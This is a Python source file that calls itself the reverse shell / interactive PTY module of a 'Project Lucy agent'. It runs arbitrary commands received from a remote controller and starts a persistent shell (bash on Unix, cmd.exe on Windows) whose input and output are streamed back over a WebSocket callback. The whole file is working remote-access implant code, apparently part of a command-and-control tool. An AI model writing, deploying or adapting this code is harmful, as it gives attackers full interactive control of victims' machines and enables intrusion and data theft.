"""
Reverse shell / interactive PTY module for Project Lucy agent.
Supports single-shot exec and persistent interactive PTY session streamed over WS.
"""
import os
import platform
import subprocess
import threading

SYSTEM = platform.system()
_pty_thread: threading.Thread | None = None
_pty_stop = threading.Event()


def run(
    action: str = "exec",
    cmd: str = "id",
    timeout: int = 30,
    send_callback=None,
    recv_iter=None,
    **kwargs,
) -> dict:
    if action == "exec":
        return _exec(cmd, timeout)

    elif action == "pty_start":
        if send_callback is None:
            return {"error": "send_callback required for pty_start"}
        return _pty_start(send_callback, recv_iter)

    elif action == "pty_stop":
        return _pty_stop_fn()

    return {"error": f"Unknown action: {action}"}


def _exec(cmd: str, timeout: int) -> dict:
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=timeout,
            text=True,
            errors="replace",
        )
        return {
            "status": "completed",
            "data": {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
            },
        }
    except subprocess.TimeoutExpired:
        return {"status": "failed", "error": "timeout", "data": None}
    except Exception as exc:
        return {"status": "failed", "error": str(exc), "data": None}


def _pty_start(send_callback, recv_iter) -> dict:
    global _pty_thread, _pty_stop

    if _pty_thread and _pty_thread.is_alive():
        return {"status": "already_running"}

    _pty_stop.clear()

    if SYSTEM != "Windows":
        return _pty_unix(send_callback, recv_iter)
    else:
        return _pty_windows(send_callback, recv_iter)


def _pty_unix(send_callback, recv_iter) -> dict:
    global _pty_thread

    try:
        import pty
        master_fd, slave_fd = pty.openpty()
        shell = os.environ.get("SHELL", "/bin/bash")

        proc = subprocess.Popen(
            [shell],
            stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
            close_fds=True,
        )
        os.close(slave_fd)

        def _reader():
            import select
            while not _pty_stop.is_set():
                r, _, _ = select.select([master_fd], [], [], 0.1)
                if r:
                    try:
                        data = os.read(master_fd, 4096)
                        if data:
                            send_callback({"type": "pty_output", "payload": {"data": data.decode("utf-8", errors="replace")}})
                    except OSError:
                        break
                if proc.poll() is not None:
                    break
            send_callback({"type": "pty_exit", "payload": {"returncode": proc.returncode}})

        def _writer():
            if recv_iter is None:
                return
            for data in recv_iter:
                if _pty_stop.is_set():
                    break
                try:
                    os.write(master_fd, data.encode() if isinstance(data, str) else data)
                except OSError:
                    break

        _pty_thread = threading.Thread(target=_reader, daemon=True)
        _pty_thread.start()
        threading.Thread(target=_writer, daemon=True).start()
        return {"status": "started", "pid": proc.pid}

    except Exception as exc:
        return {"error": str(exc)}


def _pty_windows(send_callback, recv_iter) -> dict:
    """Windows fallback — use cmd.exe via subprocess with pipes."""
    global _pty_thread

    try:
        proc = subprocess.Popen(
            ["cmd.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )

        def _reader():
            for line in iter(proc.stdout.readline, b""):
                if _pty_stop.is_set():
                    break
                send_callback({"type": "pty_output", "payload": {"data": line.decode("utf-8", errors="replace")}})
            send_callback({"type": "pty_exit", "payload": {"returncode": proc.returncode}})

        def _writer():
            if recv_iter is None:
                return
            for data in recv_iter:
                if _pty_stop.is_set():
                    break
                try:
                    proc.stdin.write((data if data.endswith("\n") else data + "\n").encode())
                    proc.stdin.flush()
                except Exception:
                    break

        _pty_thread = threading.Thread(target=_reader, daemon=True)
        _pty_thread.start()
        threading.Thread(target=_writer, daemon=True).start()
        return {"status": "started", "pid": proc.pid}
    except Exception as exc:
        return {"error": str(exc)}


def _pty_stop_fn() -> dict:
    _pty_stop.set()
    return {"status": "stopped"}
